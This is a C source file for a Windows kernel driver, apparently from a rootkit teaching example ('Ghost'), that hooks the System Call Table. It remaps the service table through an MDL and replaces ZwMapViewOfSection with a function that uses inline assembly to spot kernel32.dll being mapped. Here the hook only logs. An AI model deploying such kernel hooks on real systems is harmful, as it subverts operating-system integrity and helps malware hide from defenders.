// hookManager
// Copyright Ric Vieler, 2006
// Hook the System Call Table

#include "ntddk.h"
#include "Ghost.h"
#include "hookManager.h"

extern ULONG majorVersion;
extern ULONG minorVersion;

// Used to compare a full path to a file name
BOOL IsSameFile(PUNICODE_STRING shortString, PUNICODE_STRING longString)
{
	USHORT index;
	USHORT longLen;
	USHORT shortLen;
	USHORT count;

	// Check input
	if( !shortString || 
		shortString->Length == 0 ||
		!longString ||
		longString->Length == 0 ||
		(shortString->Length > longString->Length))
		return FALSE;

	index = longString->Length / 2; // wchar_t len is len / 2

	// search backwards for backslash
	while( --index )
		if ( longString->Buffer[index] == L'\\' )
			break;

	// check for same length first
	longLen = (longString->Length / 2) - index - 1;
	shortLen = shortString->Length / 2;
	if( shortLen != longLen )
		return FALSE;

	// Compare
	count = 0;
	while ( count < longLen )
		if ( longString->Buffer[++index] != shortString->Buffer[count++] )
			return FALSE;

	// Match!
	return TRUE;
}

NTSTATUS NewZwMapViewOfSection(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect )
{
	NTSTATUS status;

	// First complete the standard mapping process
	status = OldZwMapViewOfSection(	SectionHandle,
					ProcessHandle,
					BaseAddress,
					ZeroBits,
					CommitSize,
					SectionOffset OPTIONAL,
					ViewSize,
					InheritDisposition,
					AllocationType,
					Protect );

	// Now remap as required ( imageOffset only known for versions 4 & 5 )
	if( NT_SUCCESS( status ) && ( majorVersion == 4 || majorVersion == 5 ) )
	{
		unsigned int	imageOffset = 0;
		VOID*			pSection = NULL;
		unsigned int	imageSection = FALSE;
		HANDLE			hRoot = NULL;
		PUNICODE_STRING objectName = NULL;
		PVOID			pImageBase = NULL;
		UNICODE_STRING	library1 = { 0 };
		
		// Image location higher in version 4
		if( majorVersion == 4 )
			imageOffset = 24;

		if( ObReferenceObjectByHandle(	SectionHandle,
										SECTION_MAP_EXECUTE,
										*MmSectionObjectType,
										KernelMode, 
										&pSection,
										NULL ) == STATUS_SUCCESS )
		{
			// Check to see if this is an image section
			// If it is, get the root handle and the object name
			_asm
			{
				mov     edx, pSection
				mov     eax, [edx+14h]
				add     eax, imageOffset
				mov     edx, [eax]
				test    byte ptr [edx+20h], 20h
				jz      not_image_section
				mov     imageSection, TRUE
				mov     eax, [edx+24h]
				mov     edx, [eax+4]
				mov     hRoot, edx
				add     eax, 30h
				mov     objectName, eax
				not_image_section:

			}
			if( BaseAddress )
				pImageBase = *BaseAddress;

			// Mapping a DLL
			if( imageSection && pImageBase && objectName && objectName->Length > 0 )
			{
				RtlInitUnicodeString( &library1, L"kernel32.dll" );
				if ( IsSameFile( &library1, objectName ) )
					DbgPrint( "comint32: NewZwMapViewOfSection found KERNEL32!" );
				else
					DbgPrint( "comint32: NewZwMapViewOfSection object = %wZ", objectName );
			}
			ObDereferenceObject( pSection );
		}
	}
	return status;
}

NTSTATUS Hook( )
{
	pMyMDL = MmCreateMdl(	NULL,
					KeServiceDescriptorTable.ServiceTableBase,
					KeServiceDescriptorTable.NumberOfServices * 4 );

	if( !pMyMDL )
		return( STATUS_UNSUCCESSFUL );

	MmBuildMdlForNonPagedPool( pMyMDL );
	pMyMDL->MdlFlags = pMyMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
	NewSystemCallTable = MmMapLockedPages( pMyMDL, KernelMode );

	if( !NewSystemCallTable )
		return( STATUS_UNSUCCESSFUL );
	
	// Add hooks here (remember to unhook if using DriverUnload)

	HOOK( ZwMapViewOfSection, NewZwMapViewOfSection, OldZwMapViewOfSection );

	return( STATUS_SUCCESS );
}
